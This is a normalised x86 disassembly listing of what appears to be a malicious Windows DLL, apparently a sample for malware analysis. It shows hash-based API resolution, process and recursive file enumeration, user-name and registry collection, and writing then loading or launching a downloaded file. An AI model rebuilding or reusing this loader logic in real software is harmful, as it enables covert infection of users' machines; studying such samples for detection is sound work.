mov ecx [ ebp + 0x1b8 ]
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0x1bc
leave
retn
push ebx
push edi
push 0x2
push 0x2
push 0xaa85fd7f
mov ebx r--data
push ebx
call sub_10001347
add esp 0x14
mov [ ebp - 0x7c ] eax
cmp eax 0xffffffff
jne r-xdata
mov esi 0x22c
push esi
push edi
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push 0x9af9fa4b
mov edi r--data
push edi
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x7c ]
mov [ ebp - 0x74 ] esi
call Process32FirstW
test eax eax
jne r-xdata
xor eax eax
lea esi [ ebp - 0x50 ]
call sub_10002185
test eax eax
je r-xdata
xor esi esi
mov eax [ ebp - 0x78 ]
jmp r-xdata
push [ ebp - 0x80 ]
mov eax esi
push eax
push 0x2
push 0xd75c3a47
push edi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
pop ebx
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x7c ]
call Process32NextW
test eax eax
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x78 ] eax
mov esi [ ebp - 0x78 ]
jmp r-xdata
push [ ebp - 0x7c ]
push 0x1
push 0xed00c776
push ebx
call sub_10001347
add esp 0x10
mov eax esi
jmp r-xdata
sub_1000231a
push esi
push edi
push [ esp + 0xc ]
xor edi edi
push edi
push 0x20000
push 0x3
push 0x655eb9ab
mov esi r--data
push esi
call sub_10001347
add esp 0x18
cmp eax edi
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push eax
inc edi
push edi
push 0xed00c776
push esi
call sub_10001347
add esp 0x10
sub_10002359
push esi
push [ esp + 0x8 ]
xor esi esi
push 0x1
push esi
push 0x3
push 0x4bb7c907
push r--data
call sub_10001347
add esp 0x18
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
inc esi
sub_10002382
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push [ ebp + 0xc ]
xor esi esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push eax
push eax
call sub_10010350
add esp 0x18
test eax eax
je r-xdata
mov eax esi
pop esi
leave
retn 0x8
inc esi
sub_100023af
push ebp
mov ebp esp
mov eax 0x125c
call sub_10010a80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx 0x94
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x1238 ]
[ edi ] [ esi ]
call [ GetProcessHeap@IAT ]
push 0x7e8
push 0x0
mov [ ebp - 0x123c ] eax
lea eax [ ebp - 0xfe8 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x120c ]
push eax
call sub_10002ade
mov esi eax
lea eax [ ebp - 0x1004 ]
push eax
call sub_10002ade
lea eax [ eax + esi + 0x104 ]
cmp eax 0x400
jbe r-xdata
test [ ebp - 0x1238 ] 0x10
lea eax [ ebp - 0x18 ]
mov edi r--data
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn 0x250
push eax
push 0x0
push [ ebp - 0x123c ]
call [ HeapSize@IAT ]
lea esi [ esi + eax + 0x2 ]
push esi
push [ ebx ]
push 0x8
push [ ebp - 0x123c ]
call [ HeapReAlloc@IAT ]
inc esi
inc esi
push esi
push 0x8
push [ ebp - 0x123c ]
call [ HeapAlloc@IAT ]
jmp r-xdata
push eax
push 0x2
push 0x825884e9
push edi
call sub_10001347
mov esi [ FileTimeToSystemTime@IAT ]
add esp 0x14
lea eax [ ebp - 0x124c ]
push eax
lea eax [ ebp - 0x1234 ]
push eax
call esi
lea eax [ ebp - 0x125c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call esi
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x1218 ]
movzx eax [ ebp - 0x1256 ]
push eax
movzx eax [ ebp - 0x125a ]
push eax
movzx eax [ ebp - 0x125c ]
push eax
movzx eax [ ebp - 0x1246 ]
push eax
movzx eax [ ebp - 0x124a ]
push eax
movzx eax [ ebp - 0x124c ]
push eax
lea eax [ ebp - 0x1004 ]
push eax
lea eax [ ebp - 0x120c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xfe8 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x34
lea eax [ ebp - 0xfe8 ]
push eax
call sub_10002ade
mov esi eax
mov eax [ ebx ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xfe8 ]
push eax
push ebx
push 0x2
push 0x6e587d69
push edi
call sub_10001347
add esp 0x14
mov eax esi
mov [ ebx ] eax
mov ebx eax
test ebx ebx
je r-xdata
sub_1000256f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x474
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x470 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] esi
call [ GetProcessHeap@IAT ]
push 0x24c
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x28 ]
push 0x0
push eax
mov [ esp + 0x2c ] 0x250
call sub_10010a00
and [ esp + 0x28 ] 0x0
add esp 0xc
test ebx ebx
jne r-xdata
push r--data
push ebx
push 0x2
push 0xd75c3a47
push r--data
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_10002ade
mov edi eax
mov eax [ esi ]
add edi 0x3c
mov [ esp + 0x18 ] edi
test eax eax
jne r-xdata
mov ecx [ esp + 0x47c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000fe6e
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x0
push [ esp + 0x14 ]
call [ HeapSize@IAT ]
lea eax [ edi + eax + 0x64 ]
push eax
push [ esi ]
mov [ esp + 0x20 ] eax
push 0x8
push [ esp + 0x18 ]
call [ HeapReAlloc@IAT ]
push edi
push 0x8
push [ esp + 0x14 ]
call [ HeapAlloc@IAT ]
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
push ebx
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] eax
test eax eax
je r-xdata
push r--data
push [ esi ]
mov edi 0x6e587d69
push 0x2
push edi
mov ebx r--data
push ebx
call sub_10001347
add esp 0x14
push [ esp + 0x10 ]
push [ esi ]
push 0x2
push edi
push ebx
call sub_10001347
add esp 0x14
push r--data
push [ esi ]
push 0x2
push edi
push ebx
call sub_10001347
sub esp 0x23c
mov edi esp
mov ecx 0x94
lea esi [ esp + 0x270 ]
[ edi ] [ esi ]
mov edi [ esp + 0x264 ]
mov ecx edi
call sub_100023af
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
ja r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
jmp r-xdata
mov eax [ esp + 0x1c ]
jmp r-xdata
push r--data
push [ esi ]
mov edi 0x6e587d69
push 0x2
push edi
mov ebx r--data
push ebx
call sub_10001347
add esp 0x14
push [ esp + 0x10 ]
push [ esi ]
push 0x2
push edi
push ebx
call sub_10001347
add esp 0x14
push r--data
push [ esi ]
push 0x2
push edi
push ebx
call sub_10001347
add esp 0x14
push [ esi ]
call sub_10002ade
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
push r--data
push [ edi ]
mov esi 0x6e587d69
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
push [ esp + 0xc ]
call [ FindClose@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
push [ edi ]
call sub_10002ade
push 0xa
push 0x1
push 0x9ace3327
push ebx
mov esi eax
call sub_10001347
mov eax esi
add esp 0x10
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x14 ]
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0x18 ] 0x0
jbe r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push eax
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
mov edi 0x56e87f69
sub esp 0x250
mov edi esp
mov ecx 0x94
lea esi [ esp + 0x270 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x264 ]
call sub_100023af
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
mov edi [ esp + 0x14 ]
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
lea eax [ esp + 0x4c ]
push eax
push 0x1
push edi
push ebx
call sub_10001347
add esp 0x10
test eax eax
jbe r-xdata
mov edi [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ecx r--data
lea eax [ esp + 0x4c ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
test [ esp + 0x20 ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
push 0x104
push 0x0
lea eax [ esp + 0x278 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push [ esp + 0x28 ]
push 0x1
push edi
push ebx
call sub_10001347
lea eax [ eax + eax - 0x6 ]
push eax
push [ esp + 0x3c ]
lea eax [ esp + 0x2a0 ]
push eax
call sub_10010ab0
add esp 0x34
lea eax [ esp + 0x4c ]
push eax
lea eax [ esp + 0x274 ]
push eax
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
push r--data
lea eax [ esp + 0x274 ]
push eax
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
push [ esp + 0x14 ]
lea eax [ esp + 0x274 ]
push eax
push 0x1
call sub_1000256f
test eax eax
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_100029d9
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
push edi
push 0x6
push 0x4
push edi
push 0x2
push 0x40000000
push [ ebp + 0x8 ]
mov esi r--data
push 0x7
push 0x47763959
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] edi
call sub_10001347
mov ebx eax
add esp 0x28
cmp ebx 0xffffffff
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
call [ GetFileSize@IAT ]
push edi
push edi
push eax
push ebx
push 0x4
push 0x7d6e6b81
push esi
mov [ ebp - 0x4 ] eax
call sub_10001347
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
push 0x5
push 0x76a474f
push esi
call sub_10001347
xor ecx ecx
add esp 0x3c
inc ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push ecx
push 0xed00c776
push esi
call sub_10001347
mov eax [ ebp - 0x8 ]
add esp 0x10
mov [ ebp - 0x8 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_10002a7c
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x1
push 0x80000000
push [ ebp + 0x8 ]
mov esi r--data
push 0x7
push 0x47763959
push esi
mov [ ebp - 0x4 ] eax
call sub_10001347
mov edi eax
add esp 0x28
cmp edi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
call [ GetFileSize@IAT ]
push edi
push 0x1
push 0xed00c776
push esi
mov ebx eax
call sub_10001347
add esp 0x10
mov eax ebx
pop ebx
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
sub_10002b33
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x18c ] eax
push esi
push edi
mov esi 0x104
push esi
xor edi edi
push edi
lea eax [ ebp - 0x7c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x80 ] esi
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18c ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0x190
leave
retn
lea esi [ ebp - 0x7c ]
call sub_10002185
mov eax esi
push r--data
push eax
call sub_100101bc
pop ecx
pop ecx
test eax eax
jne r-xdata
inc edi
sub_10002bbb
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x18c ] eax
mov eax [ ebp + 0x198 ]
push r--data
push r--data
mov [ ebp - 0x80 ] eax
push 0x80000000
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
mov [ ebp - 0x78 ] 0x200
call sub_10001edd
test eax eax
je r-xdata
mov ecx [ ebp + 0x18c ]
xor ecx ebp
call sub_1000fe6e
add ebp 0x190
leave
retn 0x8
push esi
push edi
xor edi edi
cmp [ ebp - 0x78 ] edi
jbe r-xdata
push ebx
mov ebx r--data
push ebx
lea eax [ ebp - 0x74 ]
push eax
push 0x2
mov esi 0xd75c3a47
push esi
mov edi r--data
push edi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
lea esi [ ebp + edi - 0x74 ]
movzx eax [ esi ]
push eax
call sub_10010515
inc edi
pop ecx
mov [ esi ] al
cmp edi [ ebp - 0x78 ]
jb r-xdata
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x78 ]
inc eax
push eax
call sub_1000ff5a
push ebx
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x74 ]
push eax
push 0x2
push esi
push edi
call sub_10001347
push eax
push [ ebp - 0x7c ]
push 0x2
push 0x825884e9
push r--data
call sub_10001347
mov esi [ ebp - 0x78 ]
add esp 0x2c
push [ ebp - 0x7c ]
call sub_10002ade
sub esi eax
mov eax [ ebp - 0x78 ]
inc eax
push eax
push 0x0
push [ ebp - 0x7c ]
push 0x3
push 0x9af9fa4b
push edi
call sub_10001347
add esp 0x18
lea ebx [ esi - 0x1 ]
dec ebx
jmp r-xdata
mov eax esi
sub eax ebx
cmp [ ebp + 0x19c ] eax
jbe r-xdata
cmp [ ebp + ebx - 0x74 ] 0x5c
jne r-xdata
test eax eax
ja r-xdata
push [ ebp + 0x19c ]
push 0x0
push [ ebp - 0x80 ]
push 0x3
push 0x9af9fa4b
push edi
call sub_10001347
sub esi ebx
dec esi
dec esi
push esi
lea eax [ ebp + ebx - 0x72 ]
push eax
push [ ebp - 0x80 ]
call sub_10010ab0
push [ ebp - 0x7c ]
call sub_1000fe7d
xor eax eax
add esp 0x28
inc eax
sub_10002d1b
push ebp
lea ebp [ esp - 0x3c0 ]
sub esp 0x440
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x3bc ] eax
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
mov eax r--data
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x4c ] eax
push 0x200
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x80 ] r--data
mov [ ebp - 0x7c ] r--data
mov [ ebp - 0x78 ] r--data
mov [ ebp - 0x70 ] r--data
mov [ ebp - 0x6c ] r--data
mov [ ebp - 0x68 ] r--data
mov [ ebp - 0x64 ] r--data
mov [ ebp - 0x60 ] r--data
mov [ ebp - 0x5c ] r--data
mov [ ebp - 0x58 ] r--data
mov [ ebp - 0x54 ] r--data
mov [ ebp - 0x50 ] r--data
mov [ ebp - 0x48 ] r--data
call sub_10002bbb
test eax eax
je r-xdata
push edi
xor edi edi
lea ecx [ ebp - 0x44 ]
call sub_1000221a
test eax eax
je r-xdata
mov [ esi ] eax
inc edi
cmp edi 0xf
jb r-xdata
mov [ esi ] eax
jmp r-xdata
push 0x0
push 0xbdd269db
push r--data
call sub_10001347
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x4 ] eax
mov ecx [ ebp + edi * 4 - 0x80 ]
call sub_1000221a
test eax eax
jne r-xdata
jmp r-xdata
mov ecx r--data
call sub_1000221a
test eax eax
je r-xdata
mov ecx [ ebp + 0x3bc ]
xor ecx ebp
call sub_1000fe6e
add ebp 0x3c0
leave
retn
mov [ esi + 0x8 ] eax
pop edi
sub_10002e25
push ebp
lea ebp [ esp - 0x7c0 ]
sub esp 0x840
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x7bc ] eax
push ebx
push esi
push edi
xor ebx ebx
call [ GetProcessHeap@IAT ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x48 ] rw-data
mov ecx [ ebp + 0x7bc ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1000fe6e
add ebp 0x7c0
leave
retn
mov edi 0x672e46
push edi
call sub_1000ff5a
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
push esi
call sub_1000fe7d
jmp r-xdata
push edi
push 0x0
push eax
push 0x3
push 0x9af9fa4b
mov edi r--data
push edi
call sub_10001347
mov eax [ ebp - 0x48 ]
add esp 0x18
push [ eax ]
lea eax [ esi + 0x4 ]
push r--data
push 0x80000001
push eax
push [ esi ]
call sub_10001edd
test eax eax
je r-xdata
pop ecx
push [ esi ]
call sub_1000fe7d
push esi
call sub_1000fe7d
add [ ebp - 0x48 ] 0x4
cmp [ ebp - 0x48 ] rw-data
pop ecx
pop ecx
jle r-xdata
mov eax [ ebp - 0x48 ]
push [ eax ]
call sub_10001f52
push [ esi ]
call sub_10005b9b
mov [ ebp - 0x58 ] eax
test eax eax
je r-xdata
push 0x8
call sub_1000ff5a
mov esi eax
pop ecx
mov [ ebp - 0x6c ] esi
test esi esi
je r-xdata
jmp r-xdata
test ebx ebx
je r-xdata
push 0x4c5358
call sub_1000ff5a
mov ebx eax
mov eax [ ebp - 0x58 ]
push [ eax + 0x98 ]
add eax 0x9c
push eax
push ebx
call sub_10010ab0
mov eax [ ebx + 0x814 ]
mov [ ebp - 0x70 ] eax
shl eax 0x6
add esp 0x10
mov [ ebp - 0x4c ] eax
call [ GetProcessHeap@IAT ]
push [ ebp - 0x4c ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x50 ] eax
test eax eax
je r-xdata
push [ esi ]
call sub_1000fe7d
push esi
call sub_1000fe7d
pop ecx
lea esi [ ebx + 0x4 ]
lea edi [ ebp - 0x68 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x80 ]
push eax
movsd [ edi ] [ esi ]
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x80 ]
cmp ax [ ebp - 0x68 ]
jne r-xdata
push [ ebp - 0x58 ]
push 0x0
push [ ebp - 0x54 ]
call [ HeapFree@IAT ]
push 0x0
push 0x0
push [ ebp - 0x70 ]
lea eax [ ebx + 0x818 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_10007b50
test eax eax
je r-xdata
mov eax ebx
call sub_1000316c
mov esi eax
mov ax [ ebp - 0x7e ]
cmp ax [ ebp - 0x66 ]
jbe r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
push [ ebp - 0x50 ]
call sub_10001000
jmp r-xdata
jb r-xdata
xor esi esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x4c4b40
ja r-xdata
mov ax [ ebp - 0x7a ]
cmp ax [ ebp - 0x62 ]
ja r-xdata
push 0x400
push 0x0
lea eax [ ebp - 0x44 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push [ ebx ]
lea eax [ ebp - 0x44 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
push esi
lea eax [ ebp - 0x44 ]
push eax
call sub_1000177e
push ebx
call sub_1000fe7d
mov [ esp ] 0x3a98
push 0x1
push 0x9ace3327
push r--data
call sub_10001347
mov esi [ ebp - 0x6c ]
add esp 0x10
push [ ebx + 0x814 ]
lea eax [ ebx + 0x818 ]
push 0x0
push eax
push 0x3
push 0x9af9fa4b
push edi
call sub_10001347
mov edi [ ebp - 0x4c ]
push edi
push [ ebp - 0x50 ]
lea eax [ ebx + 0x818 ]
push eax
call sub_10010ab0
add esp 0x24
push [ ebp - 0x50 ]
mov [ ebx + 0x814 ] edi
push 0x0
push [ ebp - 0x54 ]
call [ HeapFree@IAT ]
jb r-xdata
mov ax [ ebp - 0x60 ]
push 0x19
pop ecx
cmp cx ax
je r-xdata
cmp [ ebp - 0x78 ] ax
ja r-xdata
mov ax [ ebp - 0x5e ]
push 0x3d
pop ecx
cmp cx ax
je r-xdata
cmp [ ebp - 0x76 ] ax
ja r-xdata
sub_100030ce
push esi
push edi
push 0xc
call sub_1000ff5a
pop ecx
mov edi r--data
push edi
mov esi eax
call sub_1000231a
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
push edi
call sub_10002359
test eax eax
jne r-xdata
mov ebx 0x9ace3327
mov edi r--data
push esi
call sub_1000fe7d
pop ecx
call sub_10002e25
push 0x4e20
push 0x1
push ebx
push edi
call sub_10001347
add esp 0x10
jmp r-xdata
mov eax [ esi ]
test eax eax
jbe r-xdata
push 0xc
push 0x0
push esi
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
call sub_10002d1b
push r--data
call sub_1000231a
test eax eax
jne r-xdata
push eax
call sub_10001151
push 0x2710
push 0x1
push ebx
push edi
call sub_10001347
add esp 0x10
sub_1000316c
sub esp 0xc
and [ esp ] 0x0
push ebp
push edi
mov edi eax
lea ebp [ edi + 0x14 ]
test ebp ebp
jne r-xdata
push ebp
push 0x1
push 0x56e87f69
push r--data
call sub_10001347
add esp 0x10
cmp eax 0x3
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
push r--data
push ebp
push 0x2
mov ebx 0xd75c3a47
push ebx
mov esi r--data
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
pop edi
pop ebp
add esp 0xc
retn
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ edi + 0x814 ]
lea eax [ edi + 0x818 ]
push eax
call sub_10003497
test eax eax
je r-xdata
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ edi + 0x814 ]
lea eax [ edi + 0x818 ]
push eax
call sub_10003558
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
mov eax [ edi ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x814 ]
mov [ esp + 0x18 ] eax
lea eax [ edi + 0x818 ]
push eax
call sub_10001fc3
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ edi ]
mov eax [ edi + 0x814 ]
lea ecx [ edi + 0x818 ]
call sub_100035b9
test eax eax
je r-xdata
lea eax [ edi + 0x818 ]
push eax
call sub_10002a7c
cmp eax 0x4c4b40
ja r-xdata
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
mov eax [ edi + 0x814 ]
push 0x1
push r--data
push r--data
push 0x80000001
push eax
lea eax [ edi + 0x818 ]
push eax
call sub_10001e34
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
push [ esp + 0x14 ]
lea eax [ edi + 0x818 ]
push 0x10
push [ esp + 0x20 ]
push eax
call sub_10003f6c
test eax eax
je r-xdata
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
lea eax [ edi + 0x818 ]
push eax
call sub_100036d3
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x10 ] 0x1
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ edi + 0x814 ]
lea eax [ edi + 0x818 ]
push eax
call sub_1000390b
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ edi ]
lea eax [ edi + 0x818 ]
mov edi [ edi + 0x814 ]
push eax
call sub_10003c0f
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
push r--data
push ebp
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
pop esi
pop ebx
test eax eax
je r-xdata
call sub_100059ef
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x8 ]
mov edi r--data
call sub_10003c61
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov edi r--data
call sub_10003c61
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x1
sub_100033fe
push ebx
push ebp
push esi
push edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
mov ebp 0x104
push ebp
mov esi eax
push 0x8
push esi
call ebx
push ebp
push 0x8
push esi
mov edi eax
call ebx
mov ebx eax
test edi edi
jne r-xdata
push edi
test ebx ebx
jne r-xdata
xor eax eax
jmp r-xdata
push 0x82
push 0x2
push 0x88ea0179
mov ebp r--data
push ebp
call sub_10001347
add esp 0x14
test eax eax
jne r-xdata
push ebx
push esi
call [ HeapFree@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push 0x0
push r--data
push edi
push 0x4
push 0x7072ed0f
push ebp
call sub_10001347
add esp 0x1c
push edi
push 0x0
push esi
call [ HeapFree@IAT ]
mov eax ebx
push edi
mov edi [ HeapFree@IAT ]
push eax
push esi
call edi
push ebx
push 0x0
push esi
call edi
jmp r-xdata
sub_10003497
push ebp
mov ebp esp
sub esp 0x5c
push esi
push edi
call [ GetProcessHeap@IAT ]
mov [ ebp - 0x4 ] eax
call sub_100033fe
mov edi eax
xor esi esi
mov [ ebp - 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebp + 0xc ] esi
ja r-xdata
xor eax eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_100029d9
test eax eax
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
jmp r-xdata
push ebx
push 0x44
push esi
lea eax [ ebp - 0x5c ]
push eax
push 0x3
mov ebx 0x9af9fa4b
push ebx
mov edi r--data
push edi
call sub_10001347
push 0x10
push esi
lea eax [ ebp - 0x18 ]
push eax
push 0x3
push ebx
push edi
mov [ ebp - 0x5c ] 0x44
call sub_10001347
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push esi
push 0xa
push 0xd0089021
push r--data
call sub_10001347
add esp 0x64
xor edi edi
pop ebx
test eax eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
mov eax edi
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub_10003558
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov ebx eax
call sub_100033fe
mov esi eax
xor edi edi
cmp esi edi
jne r-xdata
cmp [ esp + 0x14 ] edi
ja r-xdata
xor eax eax
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push esi
call sub_100029d9
push esi
test eax eax
je r-xdata
push esi
push edi
push ebx
call [ HeapFree@IAT ]
jmp r-xdata
call [ LoadLibraryW@IAT ]
test eax eax
jne r-xdata
xor edi edi
inc edi
jmp r-xdata
push esi
push 0x0
push ebx
call [ HeapFree@IAT ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x8
sub_100035b9
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi eax
mov ebx ecx
cmp edi 0x6
ja r-xdata
push esi
mov esi ebx
call sub_10002185
test eax eax
je r-xdata
xor eax eax
